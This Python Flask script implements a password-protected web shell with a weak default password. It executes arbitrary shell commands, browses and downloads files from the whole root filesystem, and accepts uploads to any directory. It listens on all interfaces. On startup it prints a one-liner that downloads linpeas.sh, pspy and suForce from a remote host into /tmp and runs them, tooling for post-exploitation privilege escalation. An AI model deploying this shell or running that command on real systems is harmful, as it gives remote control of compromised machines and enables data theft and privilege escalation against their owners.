#!/usr/bin/env python3

from flask import Flask, render_template_string, request, redirect, send_from_directory, session, abort
import os
import subprocess

app = Flask(__name__)
app.secret_key = 'a_secure_random_secret_key'

PASS_FILE = '.shellpass'
DEFAULT_PASS = 'password'

def get_password():
    if os.path.exists(PASS_FILE):
        with open(PASS_FILE, 'r') as f:
            return f.read().strip()
    return DEFAULT_PASS

def check_password(input_pass):
    return input_pass == get_password()

HTML_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
    <title>Shell Web</title>
    <style>
        body {
            background-color: #000;
            color: #00aaff;
            font-family: monospace;
        }
        input, button, select, textarea {
            background-color: #111;
            color: #00aaff;
            border: 1px solid #00aaff;
            margin: 4px;
            padding: 4px;
        }
        a { color: #00aaff; }
    </style>
</head>
<body>
    <h1>🔐 Shell Web Interface</h1>
    {% if not session.get('authenticated') %}
        <form method="post">
            <input type="password" name="pass" placeholder="Enter password">
            <button type="submit">Login</button>
        </form>
    {% else %}
        <a href="/browse/">Browse Filesystem</a>
        <form method="post" enctype="multipart/form-data">
            <label>Upload File:</label>
            <select name="target_dir">
                {% for d in dirs %}
                    <option value="{{ d }}">{{ d }}</option>
                {% endfor %}
            </select>
            <input type="file" name="file">
            <button type="submit">Upload</button>
        </form>

        <h2>📁 Files in Root:</h2>
        <ul>
            {% for f in files %}
                <li>
                    {{ f }} —
                    <a href="/download/{{ f }}">Download</a>
                </li>
            {% endfor %}
        </ul>

        <h2>⚙️ Run Command:</h2>
        <form method="post">
            <textarea name="command" rows="3" cols="60" placeholder="Enter shell command..."></textarea><br>
            <button type="submit">Execute</button>
        </form>

        {% if output is not none %}
            <h3>🖥️ Output:</h3>
            <pre>{{ output }}</pre>
        {% endif %}

        <form method="post">
            <button name="logout" value="1">Logout</button>
        </form>
    {% endif %}
</body>
</html>
"""

BROWSE_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
    <title>Directory listing for {{ path }}</title>
    <style>
        body { background: #000; color: #00aaff; font-family: monospace; }
        a { color: #00aaff; }
    </style>
</head>
<body>
    <h2>Directory listing for {{ path }}</h2>
    <ul>
        {% if parent %}
            <li><a href="{{ parent }}">..</a></li>
        {% endif %}
        {% for name, is_dir in entries %}
            <li>
                {% if is_dir %}
                    <a href="{{ url_for('browse', subpath=path + name + '/') }}">{{ name }}/</a>
                {% else %}
                    <a href="{{ url_for('download', filename=(path + name).lstrip('/')) }}">{{ name }}</a>
                {% endif %}
            </li>
        {% endfor %}
    </ul>
    <a href="/">Back to Shell</a>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    output = None
    if not session.get('authenticated'):
        if request.method == "POST" and "pass" in request.form:
            if check_password(request.form.get("pass", "")):
                session['authenticated'] = True
                return redirect("/")
            else:
                return "Invalid password", 403
        return render_template_string(HTML_TEMPLATE, files=[], dirs=[], output=None)
    # Only authenticated users reach here
    if request.method == "POST":
        if "logout" in request.form:
            session.clear()
            return redirect("/")
        if "file" in request.files:
            target_dir = request.form.get("target_dir", "/")
            f = request.files["file"]
            if f.filename:
                f.save(os.path.join(target_dir, f.filename))
            return redirect("/")
        elif "command" in request.form:
            cmd = request.form.get("command", "")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            # Render template with output
            try:
                files = [f for f in os.listdir("/") if os.path.isfile(os.path.join("/", f))]
                dirs = [d for d in os.listdir("/") if os.path.isdir(os.path.join("/", d))]
            except Exception:
                files, dirs = [], []
            return render_template_string(HTML_TEMPLATE, files=files, dirs=dirs, output=output)
        return redirect("/")

    try:
        files = [f for f in os.listdir("/") if os.path.isfile(os.path.join("/", f))]
        dirs = [d for d in os.listdir("/") if os.path.isdir(os.path.join("/", d))]
    except Exception:
        files, dirs = [], []

    return render_template_string(HTML_TEMPLATE, files=files, dirs=dirs, output=output)

@app.route("/browse/", defaults={'subpath': ''})
@app.route("/browse/<path:subpath>")
def browse(subpath):
    if not session.get('authenticated'):
        abort(403)
    base = "/" + subpath
    base = os.path.normpath(base)
    if not os.path.isdir(base):
        abort(404)
    try:
        entries = []
        for name in sorted(os.listdir(base)):
            full = os.path.join(base, name)
            entries.append((name, os.path.isdir(full)))
    except Exception:
        entries = []
    parent = None
    if base != "/":
        parent_path = os.path.dirname(subpath.rstrip("/"))
        parent = "/browse/" + parent_path if parent_path else "/browse/"
    return render_template_string(BROWSE_TEMPLATE, path=subpath if subpath else "/", entries=entries, parent=parent)

@app.route("/download/<path:filename>")
def download(filename):
    if not session.get('authenticated'):
        abort(403)
    file_path = os.path.join("/", filename)
    if not os.path.exists(file_path):
        abort(404)
    return send_from_directory("/", filename, as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload_raw():
    if not session.get('authenticated'):
        abort(403)
    # Accepts raw POST data and saves as 'uploaded_file' in current directory
    data = request.get_data()
    with open("uploaded_file", "wb") as f:
        f.write(data)
    return "OK.\n", 200

if __name__ == "__main__":
    print("Serving HTTP on port 5656 (GET to list/download, POST to /upload to upload)...")
    try:
        ips = os.popen("ips").read()
        print(ips)
    except Exception:
        pass
    print("target=IP;cd /tmp;wget $target/linpeas.sh;wget $target/pspy;wget $target/suForce;chmod +x *;./linpeas.sh")
    print("******************************")
    app.run(debug=False, host='0.0.0.0', port=5656)
